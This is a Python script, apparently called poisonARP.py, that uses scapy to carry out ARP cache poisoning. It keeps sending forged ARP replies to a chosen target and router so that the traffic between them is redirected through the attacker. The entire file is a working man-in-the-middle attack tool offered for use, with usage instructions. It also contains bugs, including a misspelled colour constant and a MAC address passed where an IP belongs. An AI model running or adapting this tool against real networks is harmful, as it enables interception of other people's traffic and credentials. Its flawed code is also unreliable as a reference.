#!/bin/python3
import scapy.all as scapy
import os
import sys
from ipaddress import IPv4Address
from argparse import ArgumentParser
from colorama import Fore, Style
from terminaltables import AsciiTable
from time import sleep


my_mac = ''


def check_root():
    # checking if user running the script is root or have root privileges

    if os.getuid() != 0:
        print(Fore.RED, Style.BRIGHT, '[-]: run as root')
        return False
    return True


def check_py_version():
    # checking python version:-> cause the os must be linux inorder to run the script

    if sys.version_info[0] != 3:
        print('[-]: python3 required to run the script')
        return False
    return True


def check_ip(ip):
    # checking if the ip provided is valid

    try:
        IPv4Address(ip)
        return True

    except ValueError:
        print(Fore.REd, Style.BRIGHT, '[-]: IP address is only invalid')
        return False


def check_os():
    if sys.platform != 'linux':
        print(Fore.RED, Style.BRIGHT, '[-]: runs only on linux')
        return False
    return True


def get_mac(target):
    global my_mac
    """"
    return the target mac address provided target ip provided
    :parameter: target
    :type: string
    :returns: target mac address
    """

    broadcast = 'ff:ff:ff:ff:ff:ff'
    ether = scapy.Ether(dst=broadcast)
    arp = scapy.ARP(pdst=target)
    my_mac = arp.hwsrc
    answer = scapy.srp(ether / arp, timeout=1, verbose=False)[0]

    try:
        return answer[0][1].hwsrc
    except IndexError:
        return False


def print_arp_table(target_ip, router_ip):
    global my_mac
    table_data = [['Internet Address', 'Physical Address', 'Type'],     # main table
                  [target_ip, get_mac(target_ip), 'static'],            # first row
                  [router_ip, my_mac, 'static']]                        # second row
    ascii_table = AsciiTable(table_data=table_data)

    ascii_table.title = 'arp -a'
    ascii_table.inner_row_border = True
    ascii_table.inner_column_border = True
    print(ascii_table.table)


def spoof_arp_table(target_ip, router_ip):
    """"
    This Function Will spoof target target_arp_packet table
    :parameter: router_ip
    :type: string
    :parameter: target_ip
    :type: string
    """
    if get_mac(target_ip):

        target_mac = get_mac(target_ip)
        router_mac = get_mac(router_ip)
        target_arp_packet = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
        router_arp_packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_mac)
        packet_count = 1

        while True:

            try:
                scapy.send(target_arp_packet, verbose=False)
                scapy.send(router_arp_packet, verbose=False)
                print(Fore.GREEN, Style.BRIGHT,
                      '[Target Packet]:({0}) Packet Sent To: {1}:{2}'.format(packet_count, target_ip, target_mac))
                print(Fore.GREEN, Style.BRIGHT,
                      '[Router Packet]:({0}) Packet Sent To: {1}:{2}'.format(packet_count, router_ip, router_mac))
                packet_count += 1
                sleep(2)

            except KeyboardInterrupt:
                print_arp_table(target_ip, router_ip)
                print(Fore.RED, Style.BRIGHT, '[-]: Exiting ...')
                sys.exit(1)
    else:
        print(Fore.RED, Style.BRIGHT, '[-]: Failed To Get Target MAC Address. Make Sure You Are On The Same Network')
        sys.exit(1)


if __name__ == '__main__':

    parser = ArgumentParser()
    parser.usage = 'usage -> sudo python3 poisonARP.py --tip [target ip] --rip [router ip]'
    parser.add_argument('-t', '--tip', help='target ip address', type=str)
    parser.add_argument('-r', '--rip', help='router ip address', type=str)
    args = parser.parse_args()

    if args.tip and args.rip:

        if check_os() and check_ip(args.tip) and check_root() and check_ip(args.rip) and check_py_version():
            spoof_arp_table(args.tip, args.rip)
    else:
        print(Fore.GREEN, Style.BRIGHT, parser.usage)
